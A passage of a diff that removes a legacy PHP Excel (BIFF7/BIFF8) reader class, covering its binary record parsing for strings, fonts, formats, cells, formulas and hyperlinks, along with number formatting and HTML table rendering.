-            for ($col = 1; $col <= $this->colcount($sheet); $col++) {
-                // Account for Rowspans/Colspans
-                $rowspan = $this->rowspan($row, $col, $sheet);
-                $colspan = $this->colspan($row, $col, $sheet);
-
-                for ($i = 0; $i < $rowspan; $i++) {
-                    for ($j = 0; $j < $colspan; $j++) {
-                        if ($i > 0 || $j > 0) {
-                            $this->sheets[$sheet]['cellsInfo'][$row + $i][$col + $j]['dontprint'] = 1;
-                        }
-                    }
-                }
-                if (! $this->sheets[$sheet]['cellsInfo'][$row][$col]['dontprint']) {
-                    $style = $this->style($row, $col, $sheet);
-                    if ($this->colhidden($col, $sheet)) {
-                        $style .= 'display:none;';
-                    }
-                    $out .= "\n\t\t<td style=\"{$style}\"" . ($colspan > 1 ? " colspan={$colspan}" : '') . ($rowspan > 1 ? " rowspan={$rowspan}" : '') . '>';
-                    $val = $this->val($row, $col, $sheet);
-                    if ($val == '') {
-                        $val = '&nbsp;';
-                    } else {
-                        $val  = htmlentities($val);
-                        $link = $this->hyperlink($row, $col, $sheet);
-                        if ($link != '') {
-                            $val = "<a href=\"{$link}\">{$val}</a>";
-                        }
-                    }
-                    $out .= '<nobr>' . nl2br($val) . '</nobr>';
-                    $out .= '</td>';
-                }
-            }
-            $out .= "</tr>\n";
-        }
-        $out .= '</tbody></table>';
-
-        return $out;
-    }
-
-    public function read16bitstring($data, $start)
-    {
-        $len = 0;
-
-        while (ord($data[$start + $len]) + ord($data[$start + $len + 1]) > 0) {
-            $len++;
-        }
-
-        return substr($data, $start, $len);
-    }
-
-    // ADDED by Matt Kruse for better formatting
-    public function _format_value($format, $num, $f)
-    {
-        // 49==TEXT format
-        // http://code.google.com/p/php-excel-reader/issues/detail?id=7
-        if ((! $f && $format == '%s') || ($f == 49) || ($format == 'GENERAL')) {
-            return ['string' => $num, 'formatColor' => null];
-        }
-
-        // Custom pattern can be POSITIVE;NEGATIVE;ZERO
-        // The "text" option as 4th parameter is not handled
-        $parts   = explode(';', $format);
-        $pattern = $parts[0];
-        // Negative pattern
-        if (count($parts) > 2 && $num == 0) {
-            $pattern = $parts[2];
-        }
-        // Zero pattern
-        if (count($parts) > 1 && $num < 0) {
-            $pattern = $parts[1];
-            $num     = abs($num);
-        }
-
-        $color       = '';
-        $matches     = [];
-        $color_regex = '/^\\[(BLACK|BLUE|CYAN|GREEN|MAGENTA|RED|WHITE|YELLOW)\\]/i';
-        if (preg_match($color_regex, $pattern, $matches)) {
-            $color   = strtolower($matches[1]);
-            $pattern = preg_replace($color_regex, '', $pattern);
-        }
-
-        // In Excel formats, "_" is used to add spacing, which we can't do in HTML
-        $pattern = preg_replace('/_./', '', $pattern);
-
-        // Some non-number characters are escaped with \, which we don't need
-        $pattern = preg_replace('/\\\\/', '', $pattern);
-
-        // Some non-number strings are quoted, so we'll get rid of the quotes
-        $pattern = preg_replace('/"/', '', $pattern);
-
-        // TEMPORARY - Convert # to 0
-        $pattern = preg_replace('/\\#/', '0', $pattern);
-
-        // Find out if we need comma formatting
-        $has_commas = preg_match('/,/', $pattern);
-        if ($has_commas) {
-            $pattern = preg_replace('/,/', '', $pattern);
-        }
-
-        // Handle Percentages
-        if (preg_match('/\\d(\\%)([^\\%]|$)/', $pattern, $matches)) {
-            $num     = $num * 100;
-            $pattern = preg_replace('/(\\d)(\\%)([^\\%]|$)/', '$1%$3', $pattern);
-        }
-
-        // Handle the number itself
-        $number_regex = '/(\\d+)(\\.?)(\\d*)/';
-        if (preg_match($number_regex, $pattern, $matches)) {
-            $left  = $matches[1];
-            $dec   = $matches[2];
-            $right = $matches[3];
-            if ($has_commas) {
-                $formatted = number_format($num, strlen($right));
-            } else {
-                $sprintf_pattern = '%1.' . strlen($right) . 'f';
-                $formatted       = sprintf($sprintf_pattern, $num);
-            }
-            $pattern = preg_replace($number_regex, $formatted, $pattern);
-        }
-
-        return [
-            'string'      => $pattern,
-            'formatColor' => $color,
-        ];
-    }
-
-    /**
-     * Set the encoding method
-     *
-     * @param mixed $encoding
-     */
-    public function setOutputEncoding($encoding)
-    {
-        $this->_defaultEncoding = $encoding;
-    }
-
-    /**
-     *  $encoder = 'iconv' or 'mb'
-     *  set iconv if you would like use 'iconv' for encode UTF-16LE to your encoding
-     *  set mb if you would like use 'mb_convert_encoding' for encode UTF-16LE to your encoding
-     *
-     * @param mixed $encoder
-     */
-    public function setUTFEncoder($encoder = 'iconv')
-    {
-        $this->_encoderFunction = '';
-        if ($encoder == 'iconv') {
-            $this->_encoderFunction = function_exists('iconv') ? 'iconv' : '';
-        } elseif ($encoder == 'mb') {
-            $this->_encoderFunction = function_exists('mb_convert_encoding') ? 'mb_convert_encoding' : '';
-        }
-    }
-
-    public function setRowColOffset($iOffset)
-    {
-        $this->_rowoffset = $iOffset;
-        $this->_coloffset = $iOffset;
-    }
-
-    /**
-     * Set the default number format
-     *
-     * @param mixed $sFormat
-     */
-    public function setDefaultFormat($sFormat)
-    {
-        $this->_defaultFormat = $sFormat;
-    }
-
-    /**
-     * Force a column to use a certain format
-     *
-     * @param mixed $column
-     * @param mixed $sFormat
-     */
-    public function setColumnFormat($column, $sFormat)
-    {
-        $this->_columnsFormat[$column] = $sFormat;
-    }
-
-    /**
-     * Read the spreadsheet file using OLE, then parse
-     *
-     * @param mixed $sFileName
-     */
-    public function read($sFileName)
-    {
-        $res = $this->_ole->read($sFileName);
-
-        // oops, something goes wrong (Darko Miljanovic)
-        if ($res === false) {
-            // check error code
-            if ($this->_ole->error == 1) {
-                // bad file
-                throw new Exception("The filename {$sFileName} is not readable or not a valid Excel file");
-            }
-
-            // check other error codes here (eg bad fileformat, etc...)
-            throw new Exception("Error reading Excel file: {$sFileName}");
-        }
-        $this->data = $this->_ole->getWorkBook();
-        $this->_parse();
-    }
-
-    /**
-     * Parse a workbook
-     *
-     * @return bool
-     */
-    public function _parse()
-    {
-        $pos  = 0;
-        $data = $this->data;
-
-        $code          = v($data, $pos);
-        $length        = v($data, $pos + 2);
-        $version       = v($data, $pos + 4);
-        $substreamType = v($data, $pos + 6);
-
-        $this->version = $version;
-
-        if (($version != SPREADSHEET_EXCEL_READER_BIFF8)
-            && ($version != SPREADSHEET_EXCEL_READER_BIFF7)) {
-            return false;
-        }
-
-        if ($substreamType != SPREADSHEET_EXCEL_READER_WORKBOOKGLOBALS) {
-            return false;
-        }
-
-        $pos += $length + 4;
-
-        $code   = v($data, $pos);
-        $length = v($data, $pos + 2);
-
-        while ($code != SPREADSHEET_EXCEL_READER_TYPE_EOF) {
-            switch ($code) {
-                case SPREADSHEET_EXCEL_READER_TYPE_SST:
-                    $spos          = $pos + 4;
-                    $limitpos      = $spos + $length;
-                    $uniqueStrings = $this->_GetInt4d($data, $spos + 4);
-                    $spos += 8;
-
-                    for ($i = 0; $i < $uniqueStrings; $i++) {
-                        // Read in the number of characters
-                        if ($spos == $limitpos) {
-                            $opcode    = v($data, $spos);
-                            $conlength = v($data, $spos + 2);
-                            if ($opcode != 0x3C) {
-                                return -1;
-                            }
-                            $spos += 4;
-                            $limitpos = $spos + $conlength;
-                        }
-                        $numChars = ord($data[$spos]) | (ord($data[$spos + 1]) << 8);
-                        $spos += 2;
-                        $optionFlags = ord($data[$spos]);
-                        $spos++;
-                        $asciiEncoding  = (($optionFlags & 0x01) == 0);
-                        $extendedString = (($optionFlags & 0x04) != 0);
-
-                        // See if string contains formatting information
-                        $richString = (($optionFlags & 0x08) != 0);
-
-                        if ($richString) {
-                            // Read in the crun
-                            $formattingRuns = v($data, $spos);
-                            $spos += 2;
-                        }
-
-                        if ($extendedString) {
-                            // Read in cchExtRst
-                            $extendedRunLength = $this->_GetInt4d($data, $spos);
-                            $spos += 4;
-                        }
-
-                        $len = ($asciiEncoding) ? $numChars : $numChars * 2;
-                        if ($spos + $len < $limitpos) {
-                            $retstr = substr($data, $spos, $len);
-                            $spos += $len;
-                        } else {
-                            // found countinue
-                            $retstr    = substr($data, $spos, $limitpos - $spos);
-                            $bytesRead = $limitpos - $spos;
-                            $charsLeft = $numChars - (($asciiEncoding) ? $bytesRead : ($bytesRead / 2));
-                            $spos      = $limitpos;
-
-                            while ($charsLeft > 0) {
-                                $opcode    = v($data, $spos);
-                                $conlength = v($data, $spos + 2);
-                                if ($opcode != 0x3C) {
-                                    return -1;
-                                }
-                                $spos += 4;
-                                $limitpos = $spos + $conlength;
-                                $option   = ord($data[$spos]);
-                                $spos++;
-                                if ($asciiEncoding && ($option == 0)) {
-                                    $len = min($charsLeft, $limitpos - $spos); // min($charsLeft, $conlength);
-                                    $retstr .= substr($data, $spos, $len);
-                                    $charsLeft -= $len;
-                                    $asciiEncoding = true;
-                                } elseif (! $asciiEncoding && ($option != 0)) {
-                                    $len = min($charsLeft * 2, $limitpos - $spos); // min($charsLeft, $conlength);
-                                    $retstr .= substr($data, $spos, $len);
-                                    $charsLeft -= $len / 2;
-                                    $asciiEncoding = false;
-                                } elseif (! $asciiEncoding && ($option == 0)) {
-                                    // Bummer - the string starts off as Unicode, but after the
-                                    // continuation it is in straightforward ASCII encoding
-                                    $len = min($charsLeft, $limitpos - $spos); // min($charsLeft, $conlength);
-
-                                    for ($j = 0; $j < $len; $j++) {
-                                        $retstr .= $data[$spos + $j] . chr(0);
-                                    }
-                                    $charsLeft -= $len;
-                                    $asciiEncoding = false;
-                                } else {
-                                    $newstr = '';
-
-                                    for ($j = 0; $j < strlen($retstr); $j++) {
-                                        $newstr = $retstr[$j] . chr(0);
-                                    }
-                                    $retstr = $newstr;
-                                    $len    = min($charsLeft * 2, $limitpos - $spos); // min($charsLeft, $conlength);
-                                    $retstr .= substr($data, $spos, $len);
-                                    $charsLeft -= $len / 2;
-                                    $asciiEncoding = false;
-                                }
-                                $spos += $len;
-                            }
-                        }
-                        $retstr = ($asciiEncoding) ? $retstr : $this->_encodeUTF16($retstr);
-
-                        if ($richString) {
-                            $spos += 4 * $formattingRuns;
-                        }
-
-                        // For extended strings, skip over the extended string data
-                        if ($extendedString) {
-                            $spos += $extendedRunLength;
-                        }
-                        $this->sst[] = $retstr;
-                    }
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_FILEPASS:
-                    return false;
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_NAME:
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_FORMAT:
-                    $indexCode = v($data, $pos + 4);
-                    if ($version == SPREADSHEET_EXCEL_READER_BIFF8) {
-                        $numchars = v($data, $pos + 6);
-                        if (ord($data[$pos + 8]) == 0) {
-                            $formatString = substr($data, $pos + 9, $numchars);
-                        } else {
-                            $formatString = substr($data, $pos + 9, $numchars * 2);
-                        }
-                    } else {
-                        $numchars     = ord($data[$pos + 6]);
-                        $formatString = substr($data, $pos + 7, $numchars * 2);
-                    }
-                    $this->formatRecords[$indexCode] = $formatString;
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_FONT:
-                    $height = v($data, $pos + 4);
-                    $option = v($data, $pos + 6);
-                    $color  = v($data, $pos + 8);
-                    $weight = v($data, $pos + 10);
-                    $under  = ord($data[$pos + 14]);
-                    $font   = '';
-                    // Font name
-                    $numchars = ord($data[$pos + 18]);
-                    if ((ord($data[$pos + 19]) & 1) == 0) {
-                        $font = substr($data, $pos + 20, $numchars);
-                    } else {
-                        $font = substr($data, $pos + 20, $numchars * 2);
-                        $font = $this->_encodeUTF16($font);
-                    }
-                    $this->fontRecords[] = [
-                        'height' => $height / 20,
-                        'italic' => (bool) ($option & 2),
-                        'color'  => $color,
-                        'under'  => ! ($under == 0),
-                        'bold'   => ($weight == 700),
-                        'font'   => $font,
-                        'raw'    => $this->dumpHexData($data, $pos + 3, $length),
-                    ];
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_PALETTE:
-                    $colors = ord($data[$pos + 4]) | ord($data[$pos + 5]) << 8;
-
-                    for ($coli = 0; $coli < $colors; $coli++) {
-                        $colOff                     = $pos + 2 + ($coli * 4);
-                        $colr                       = ord($data[$colOff]);
-                        $colg                       = ord($data[$colOff + 1]);
-                        $colb                       = ord($data[$colOff + 2]);
-                        $this->colors[0x07 + $coli] = '#' . $this->myhex($colr) . $this->myhex($colg) . $this->myhex($colb);
-                    }
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_XF:
-                    $fontIndexCode = (ord($data[$pos + 4]) | ord($data[$pos + 5]) << 8) - 1;
-                    $fontIndexCode = max(0, $fontIndexCode);
-                    $indexCode     = ord($data[$pos + 6]) | ord($data[$pos + 7]) << 8;
-                    $alignbit      = ord($data[$pos + 10]) & 3;
-                    $bgi           = (ord($data[$pos + 22]) | ord($data[$pos + 23]) << 8) & 0x3FFF;
-                    $bgcolor       = ($bgi & 0x7F);
-                    //						$bgcolor = ($bgi & 0x3f80) >> 7;
-                    $align = '';
-                    if ($alignbit == 3) {
-                        $align = 'right';
-                    }
-                    if ($alignbit == 2) {
-                        $align = 'center';
-                    }
-
-                    $fillPattern = (ord($data[$pos + 21]) & 0xFC) >> 2;
-                    if ($fillPattern == 0) {
-                        $bgcolor = '';
-                    }
-
-                    $xf                = [];
-                    $xf['formatIndex'] = $indexCode;
-                    $xf['align']       = $align;
-                    $xf['fontIndex']   = $fontIndexCode;
-                    $xf['bgColor']     = $bgcolor;
-                    $xf['fillPattern'] = $fillPattern;
-
-                    $border             = ord($data[$pos + 14]) | (ord($data[$pos + 15]) << 8) | (ord($data[$pos + 16]) << 16) | (ord($data[$pos + 17]) << 24);
-                    $xf['borderLeft']   = $this->lineStyles[($border & 0xF)];
-                    $xf['borderRight']  = $this->lineStyles[($border & 0xF0) >> 4];
-                    $xf['borderTop']    = $this->lineStyles[($border & 0xF00) >> 8];
-                    $xf['borderBottom'] = $this->lineStyles[($border & 0xF000) >> 12];
-
-                    $xf['borderLeftColor']  = ($border & 0x7F0000) >> 16;
-                    $xf['borderRightColor'] = ($border & 0x3F800000) >> 23;
-                    $border                 = (ord($data[$pos + 18]) | ord($data[$pos + 19]) << 8);
-
-                    $xf['borderTopColor']    = ($border & 0x7F);
-                    $xf['borderBottomColor'] = ($border & 0x3F80) >> 7;
-
-                    if (array_key_exists($indexCode, $this->dateFormats)) {
-                        $xf['type']   = 'date';
-                        $xf['format'] = $this->dateFormats[$indexCode];
-                        if ($align == '') {
-                            $xf['align'] = 'right';
-                        }
-                    } elseif (array_key_exists($indexCode, $this->numberFormats)) {
-                        $xf['type']   = 'number';
-                        $xf['format'] = $this->numberFormats[$indexCode];
-                        if ($align == '') {
-                            $xf['align'] = 'right';
-                        }
-                    } else {
-                        $isdate    = false;
-                        $formatstr = '';
-                        if ($indexCode > 0) {
-                            if (isset($this->formatRecords[$indexCode])) {
-                                $formatstr = $this->formatRecords[$indexCode];
-                            }
-                            if ($formatstr != '') {
-                                $tmp = preg_replace('/\\;.*/', '', $formatstr);
-                                $tmp = preg_replace('/^\\[[^\\]]*\\]/', '', $tmp);
-                                if (preg_match('/[^hmsday\\/\\-:\\s\\\\,AMP]/i', $tmp) == 0) { // found day and time format
-                                    $isdate    = true;
-                                    $formatstr = $tmp;
-                                    $formatstr = str_replace(['AM/PM', 'mmmm', 'mmm'], ['a', 'F', 'M'], $formatstr);
-                                    // m/mm are used for both minutes and months - oh SNAP!
-                                    // This mess tries to fix for that.
-                                    // 'm' == minutes only if following h/hh or preceding s/ss
-                                    $formatstr = preg_replace('/(h:?)mm?/', '$1i', $formatstr);
-                                    $formatstr = preg_replace('/mm?(:?s)/', 'i$1', $formatstr);
-                                    // A single 'm' = n in PHP
-                                    $formatstr = preg_replace('/(^|[^m])m([^m]|$)/', '$1n$2', $formatstr);
-                                    $formatstr = preg_replace('/(^|[^m])m([^m]|$)/', '$1n$2', $formatstr);
-                                    // else it's months
-                                    $formatstr = str_replace('mm', 'm', $formatstr);
-                                    // Convert single 'd' to 'j'
-                                    $formatstr = preg_replace('/(^|[^d])d([^d]|$)/', '$1j$2', $formatstr);
-                                    $formatstr = str_replace(['dddd', 'ddd', 'dd', 'yyyy', 'yy', 'hh', 'h'], ['l', 'D', 'd', 'Y', 'y', 'H', 'g'], $formatstr);
-                                    $formatstr = preg_replace('/ss?/', 's', $formatstr);
-                                }
-                            }
-                        }
-                        if ($isdate) {
-                            $xf['type']   = 'date';
-                            $xf['format'] = $formatstr;
-                            if ($align == '') {
-                                $xf['align'] = 'right';
-                            }
-                        } else {
-                            // If the format string has a 0 or # in it, we'll assume it's a number
-                            if (preg_match('/[0#]/', $formatstr)) {
-                                $xf['type'] = 'number';
-                                if ($align == '') {
-                                    $xf['align'] = 'right';
-                                }
-                            } else {
-                                $xf['type'] = 'other';
-                            }
-                            $xf['format'] = $formatstr;
-                            $xf['code']   = $indexCode;
-                        }
-                    }
-                    $this->xfRecords[] = $xf;
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_NINETEENFOUR:
-                    $this->nineteenFour = (ord($data[$pos + 4]) == 1);
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_BOUNDSHEET:
-                    $rec_offset         = $this->_GetInt4d($data, $pos + 4);
-                    $rec_typeFlag       = ord($data[$pos + 8]);
-                    $rec_visibilityFlag = ord($data[$pos + 9]);
-                    $rec_length         = ord($data[$pos + 10]);
-
-                    if ($version == SPREADSHEET_EXCEL_READER_BIFF8) {
-                        $chartype = ord($data[$pos + 11]);
-                        if ($chartype == 0) {
-                            $rec_name = substr($data, $pos + 12, $rec_length);
-                        } else {
-                            $rec_name = $this->_encodeUTF16(substr($data, $pos + 12, $rec_length * 2));
-                        }
-                    } elseif ($version == SPREADSHEET_EXCEL_READER_BIFF7) {
-                        $rec_name = substr($data, $pos + 11, $rec_length);
-                    }
-                    $this->boundsheets[] = ['name' => $rec_name, 'offset' => $rec_offset];
-                    break;
-            }
-
-            $pos += $length + 4;
-            $code   = ord($data[$pos]) | ord($data[$pos + 1]) << 8;
-            $length = ord($data[$pos + 2]) | ord($data[$pos + 3]) << 8;
-        }
-
-        foreach ($this->boundsheets as $key => $val) {
-            $this->sn = $key;
-            $this->_parsesheet($val['offset']);
-        }
-
-        return true;
-    }
-
-    /**
-     * Parse a worksheet
-     *
-     * @param mixed $spos
-     */
-    public function _parsesheet($spos)
-    {
-        $cont = true;
-        $data = $this->data;
-        // read BOF
-        $code   = ord($data[$spos]) | ord($data[$spos + 1]) << 8;
-        $length = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-
-        $version       = ord($data[$spos + 4]) | ord($data[$spos + 5]) << 8;
-        $substreamType = ord($data[$spos + 6]) | ord($data[$spos + 7]) << 8;
-
-        if (($version != SPREADSHEET_EXCEL_READER_BIFF8) && ($version != SPREADSHEET_EXCEL_READER_BIFF7)) {
-            return -1;
-        }
-
-        if ($substreamType != SPREADSHEET_EXCEL_READER_WORKSHEET) {
-            return -2;
-        }
-        $spos += $length + 4;
-
-        while ($cont) {
-            $lowcode = ord($data[$spos]);
-            if ($lowcode == SPREADSHEET_EXCEL_READER_TYPE_EOF) {
-                break;
-            }
-            $code   = $lowcode | ord($data[$spos + 1]) << 8;
-            $length = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-            $spos += 4;
-            $this->sheets[$this->sn]['maxrow'] = $this->_rowoffset - 1;
-            $this->sheets[$this->sn]['maxcol'] = $this->_coloffset - 1;
-            unset($this->rectype);
-
-            switch ($code) {
-                case SPREADSHEET_EXCEL_READER_TYPE_DIMENSION:
-                    if (! isset($this->numRows)) {
-                        if (($length == 10) || ($version == SPREADSHEET_EXCEL_READER_BIFF7)) {
-                            $this->sheets[$this->sn]['numRows'] = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-                            $this->sheets[$this->sn]['numCols'] = ord($data[$spos + 6]) | ord($data[$spos + 7]) << 8;
-                        } else {
-                            $this->sheets[$this->sn]['numRows'] = ord($data[$spos + 4]) | ord($data[$spos + 5]) << 8;
-                            $this->sheets[$this->sn]['numCols'] = ord($data[$spos + 10]) | ord($data[$spos + 11]) << 8;
-                        }
-                    }
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_MERGEDCELLS:
-                    $cellRanges = ord($data[$spos]) | ord($data[$spos + 1]) << 8;
-
-                    for ($i = 0; $i < $cellRanges; $i++) {
-                        $fr = ord($data[$spos + 8 * $i + 2]) | ord($data[$spos + 8 * $i + 3]) << 8;
-                        $lr = ord($data[$spos + 8 * $i + 4]) | ord($data[$spos + 8 * $i + 5]) << 8;
-                        $fc = ord($data[$spos + 8 * $i + 6]) | ord($data[$spos + 8 * $i + 7]) << 8;
-                        $lc = ord($data[$spos + 8 * $i + 8]) | ord($data[$spos + 8 * $i + 9]) << 8;
-                        if ($lr - $fr > 0) {
-                            $this->sheets[$this->sn]['cellsInfo'][$fr + 1][$fc + 1]['rowspan'] = $lr - $fr + 1;
-                        }
-                        if ($lc - $fc > 0) {
-                            $this->sheets[$this->sn]['cellsInfo'][$fr + 1][$fc + 1]['colspan'] = $lc - $fc + 1;
-                        }
-                    }
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_RK:
-                case SPREADSHEET_EXCEL_READER_TYPE_RK2:
-                    $row      = ord($data[$spos]) | ord($data[$spos + 1]) << 8;
-                    $column   = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-                    $rknum    = $this->_GetInt4d($data, $spos + 6);
-                    $numValue = $this->_GetIEEE754($rknum);
-                    $info     = $this->_getCellDetails($spos, $numValue, $column);
-                    $this->addcell($row, $column, $info['string'], $info);
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_LABELSST:
-                    $row     = ord($data[$spos]) | ord($data[$spos + 1]) << 8;
-                    $column  = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-                    $xfindex = ord($data[$spos + 4]) | ord($data[$spos + 5]) << 8;
-                    $index   = $this->_GetInt4d($data, $spos + 6);
-                    $this->addcell($row, $column, $this->sst[$index], ['xfIndex' => $xfindex]);
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_MULRK:
-                    $row      = ord($data[$spos]) | ord($data[$spos + 1]) << 8;
-                    $colFirst = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-                    $colLast  = ord($data[$spos + $length - 2]) | ord($data[$spos + $length - 1]) << 8;
-                    $columns  = $colLast - $colFirst + 1;
-                    $tmppos   = $spos + 4;
-
-                    for ($i = 0; $i < $columns; $i++) {
-                        $numValue = $this->_GetIEEE754($this->_GetInt4d($data, $tmppos + 2));
-                        $info     = $this->_getCellDetails($tmppos - 4, $numValue, $colFirst + $i + 1);
-                        $tmppos += 6;
-                        $this->addcell($row, $colFirst + $i, $info['string'], $info);
-                    }
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_NUMBER:
-                    $row    = ord($data[$spos]) | ord($data[$spos + 1]) << 8;
-                    $column = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-                    $tmp    = unpack('ddouble', substr($data, $spos + 6, 8)); // It machine machine dependent
-                    if ($this->isDate($spos)) {
-                        $numValue = $tmp['double'];
-                    } else {
-                        $numValue = $this->createNumber($spos);
-                    }
-                    $info = $this->_getCellDetails($spos, $numValue, $column);
-                    $this->addcell($row, $column, $info['string'], $info);
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_FORMULA:
-                case SPREADSHEET_EXCEL_READER_TYPE_FORMULA2:
-                    $row    = ord($data[$spos]) | ord($data[$spos + 1]) << 8;
-                    $column = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-                    if ((ord($data[$spos + 6]) == 0) && (ord($data[$spos + 12]) == 255) && (ord($data[$spos + 13]) == 255)) {
-                        //String formula. Result follows in a STRING record
-                        // This row/col are stored to be referenced in that record
-                        // http://code.google.com/p/php-excel-reader/issues/detail?id=4
-                        $previousRow = $row;
-                        $previousCol = $column;
-                    } elseif ((ord($data[$spos + 6]) == 1) && (ord($data[$spos + 12]) == 255) && (ord($data[$spos + 13]) == 255)) {
-                        //Boolean formula. Result is in +2; 0=false,1=true
-                        // http://code.google.com/p/php-excel-reader/issues/detail?id=4
-                        if (ord($this->data[$spos + 8]) == 1) {
-                            $this->addcell($row, $column, 'TRUE');
-                        } else {
-                            $this->addcell($row, $column, 'FALSE');
-                        }
-                    } elseif ((ord($data[$spos + 6]) == 2) && (ord($data[$spos + 12]) == 255) && (ord($data[$spos + 13]) == 255)) {
-                        //Error formula. Error code is in +2;
-                    } elseif ((ord($data[$spos + 6]) == 3) && (ord($data[$spos + 12]) == 255) && (ord($data[$spos + 13]) == 255)) {
-                        //Formula result is a null string.
-                        $this->addcell($row, $column, '');
-                    } else {
-                        // result is a number, so first 14 bytes are just like a _NUMBER record
-                        $tmp = unpack('ddouble', substr($data, $spos + 6, 8)); // It machine machine dependent
-                        if ($this->isDate($spos)) {
-                            $numValue = $tmp['double'];
-                        } else {
-                            $numValue = $this->createNumber($spos);
-                        }
-                        $info = $this->_getCellDetails($spos, $numValue, $column);
-                        $this->addcell($row, $column, $info['string'], $info);
-                    }
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_BOOLERR:
-                    $row    = ord($data[$spos]) | ord($data[$spos + 1]) << 8;
-                    $column = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-                    $string = ord($data[$spos + 6]);
-                    $this->addcell($row, $column, $string);
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_STRING:
-                    // http://code.google.com/p/php-excel-reader/issues/detail?id=4
-                    if ($version == SPREADSHEET_EXCEL_READER_BIFF8) {
-                        // Unicode 16 string, like an SST record
-                        $xpos     = $spos;
-                        $numChars = ord($data[$xpos]) | (ord($data[$xpos + 1]) << 8);
-                        $xpos += 2;
-                        $optionFlags = ord($data[$xpos]);
-                        $xpos++;
-                        $asciiEncoding  = (($optionFlags & 0x01) == 0);
-                        $extendedString = (($optionFlags & 0x04) != 0);
-                        // See if string contains formatting information
-                        $richString = (($optionFlags & 0x08) != 0);
-                        if ($richString) {
-                            // Read in the crun
-                            $formattingRuns = ord($data[$xpos]) | (ord($data[$xpos + 1]) << 8);
-                            $xpos += 2;
-                        }
-                        if ($extendedString) {
-                            // Read in cchExtRst
-                            $extendedRunLength = $this->_GetInt4d($this->data, $xpos);
-                            $xpos += 4;
-                        }
-                        $len    = ($asciiEncoding) ? $numChars : $numChars * 2;
-                        $retstr = substr($data, $xpos, $len);
-                        $xpos += $len;
-                        $retstr = ($asciiEncoding) ? $retstr : $this->_encodeUTF16($retstr);
-                    } elseif ($version == SPREADSHEET_EXCEL_READER_BIFF7) {
-                        // Simple byte string
-                        $xpos     = $spos;
-                        $numChars = ord($data[$xpos]) | (ord($data[$xpos + 1]) << 8);
-                        $xpos += 2;
-                        $retstr = substr($data, $xpos, $numChars);
-                    }
-                    $this->addcell($previousRow, $previousCol, $retstr);
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_ROW:
-                    $row     = ord($data[$spos]) | ord($data[$spos + 1]) << 8;
-                    $rowInfo = ord($data[$spos + 6]) | ((ord($data[$spos + 7]) << 8) & 0x7FFF);
-                    if (($rowInfo & 0x8000) > 0) {
-                        $rowHeight = -1;
-                    } else {
-                        $rowHeight = $rowInfo & 0x7FFF;
-                    }
-                    $rowHidden                          = (ord($data[$spos + 12]) & 0x20) >> 5;
-                    $this->rowInfo[$this->sn][$row + 1] = ['height' => $rowHeight / 20, 'hidden' => $rowHidden];
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_DBCELL:
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_MULBLANK:
-                    $row    = ord($data[$spos]) | ord($data[$spos + 1]) << 8;
-                    $column = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-                    $cols   = ($length / 2) - 3;
-
-                    for ($c = 0; $c < $cols; $c++) {
-                        $xfindex = ord($data[$spos + 4 + ($c * 2)]) | ord($data[$spos + 5 + ($c * 2)]) << 8;
-                        $this->addcell($row, $column + $c, '', ['xfIndex' => $xfindex]);
-                    }
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_LABEL:
-                    $row    = ord($data[$spos]) | ord($data[$spos + 1]) << 8;
-                    $column = ord($data[$spos + 2]) | ord($data[$spos + 3]) << 8;
-                    $this->addcell($row, $column, substr($data, $spos + 8, ord($data[$spos + 6]) | ord($data[$spos + 7]) << 8));
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_EOF:
-                    $cont = false;
-                    break;
-
-                case SPREADSHEET_EXCEL_READER_TYPE_HYPER:
-                    //  Only handle hyperlinks to a URL
-                    $row               = ord($this->data[$spos]) | ord($this->data[$spos + 1]) << 8;
-                    $row2              = ord($this->data[$spos + 2]) | ord($this->data[$spos + 3]) << 8;
-                    $column            = ord($this->data[$spos + 4]) | ord($this->data[$spos + 5]) << 8;
-                    $column2           = ord($this->data[$spos + 6]) | ord($this->data[$spos + 7]) << 8;
-                    $linkdata          = [];
-                    $flags             = ord($this->data[$spos + 28]);
-                    $udesc             = '';
-                    $ulink             = '';
-                    $uloc              = 32;
-                    $linkdata['flags'] = $flags;
-                    if (($flags & 1) > 0) {   // is a type we understand
-                        //  is there a description ?
-                        if (($flags & 0x14) == 0x14) {   // has a description
-                            $uloc += 4;
-                            $descLen = ord($this->data[$spos + 32]) | ord($this->data[$spos + 33]) << 8;
-                            $udesc   = substr($this->data, $spos + $uloc, $descLen * 2);
-                            $uloc += 2 * $descLen;
-                        }
-                        $ulink = $this->read16bitstring($this->data, $spos + $uloc + 20);
-                        if ($udesc == '') {
-                            $udesc = $ulink;
-                        }
-                    }
-                    $linkdata['desc'] = $udesc;
-                    $linkdata['link'] = $this->_encodeUTF16($ulink);
-
